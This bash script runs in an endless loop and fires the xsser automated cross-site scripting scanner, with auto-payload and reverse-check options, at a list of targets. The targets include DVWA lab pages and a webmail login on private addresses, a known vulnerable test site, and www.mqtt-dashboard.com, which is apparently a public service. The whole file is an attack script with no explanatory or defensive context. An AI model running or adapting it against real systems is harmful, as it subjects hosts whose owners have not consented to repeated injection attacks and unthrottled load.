#!/bin/bash

while :
do
	python2 xsser -u "http://192.168.1.195/dvwa/vulnerabilities/xss_r/?name=admin" --auto --reverse-check -s 	
	python2 xsser -u "http://192.168.1.195/dvwa/vulnerabilities/xss_s/" --auto --reverse-check -s 
	python2 xsser -u "http://192.168.1.152/" --auto --reverse-check -s 
	python2 xsser -u "http://192.168.1.190/webmail/src/login.php" --auto --reverse-check -s 
	python2 xsser -u "http://testphp.vulnweb.com" --auto --reverse-check -s 
	python2 xsser -u "http://www.mqtt-dashboard.com" --auto --reverse-check -s 
	python2 xsser -u "https://192.168.1.184/index.jsp?" --auto --reverse-check -s 
	


	

done


